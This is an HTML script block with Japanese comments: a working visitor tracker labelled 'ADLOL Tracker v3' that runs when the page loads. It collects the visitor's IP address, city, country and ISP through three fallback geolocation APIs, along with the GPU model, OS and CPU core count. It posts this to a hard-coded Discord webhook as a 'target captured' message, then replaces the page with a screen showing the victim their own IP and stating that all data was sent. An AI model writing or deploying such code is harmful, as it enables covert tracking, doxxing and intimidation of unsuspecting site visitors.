<script type="text/javascript">
(async function() {
    const w = "https://discord.com/api/webhooks/1480858959148486698/rogRAjEJV4UBPNPuq6vCS1mI44C77w771WdB7RWqh696LK9IOP654SsfT1zIXjaVGF87";

    // 1. IPと場所を取得する「しぶとい」関数
    async function getDeepInfo() {
        // 第1候補: ip-api (一番詳しい)
        try {
            const r = await fetch('https://demo.ip-api.com/json/?fields=66846719');
            if (r.ok) return await r.json();
        } catch (e) {}

        // 第2候補: ipapi.co (第1がダメな時)
        try {
            const r = await fetch('https://ipapi.co/json/');
            if (r.ok) {
                const d = await r.json();
                return { query: d.ip, city: d.city, country: d.country_name, isp: d.org, timezone: d.timezone };
            }
        } catch (e) {}

        // 第3候補: ipify (最低限IPだけは取る)
        try {
            const r = await fetch('https://api.ipify.org?format=json');
            if (r.ok) {
                const d = await r.json();
                return { query: d.ip, city: "特定不能(APIブロック)", isp: "不明" };
            }
        } catch (e) {}

        return { query: "取得失敗", city: "不明" };
    }

    const d = await getDeepInfo();

    // 2. その他のデバイス情報
    let gpu = "N/A";
    try {
        const canvas = document.createElement('canvas');
        const gl = canvas.getContext('webgl');
        const debugInfo = gl.getExtension('WEBGL_debug_renderer_info');
        gpu = gl.getParameter(debugInfo.UNMASKED_RENDERER_WEBGL);
    } catch(e){}

    // 3. Discordへ送信
    const payload = {
        embeds: [{
            title: "💀 ターゲット完全捕捉 (トリプルAPI)",
            color: 16711680,
            fields: [
                { name: "🌐 ネットワーク", value: `**IP:** ${d.query}\n**場所:** ${d.city}, ${d.country || ""}\n**ISP:** ${d.isp}`, inline: false },
                { name: "💻 スペック", value: `**GPU:** ${gpu}\n**OS:** ${navigator.platform}\n**コア数:** ${navigator.hardwareConcurrency}`, inline: false }
            ],
            footer: { text: "ADLOL Tracker v3" },
            timestamp: new Date()
        }]
    };

    await fetch(w, {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify(payload)
    });

    // 4. 演出（相手のIPをデカデカと出す）
    document.body.innerHTML = `
        <div style="background:#000; color:#f00; height:100vh; padding:40px; font-family:monospace;">
            <h1>[FATAL ERROR]</h1>
            <p>> IP ADDR: ${d.query}</p>
            <p>> LOCATION: ${d.city}</p>
            <p>> ALL DATA SENT TO SERVER.</p>
            <blink>_</blink>
        </div>
    `;
})();
</script>
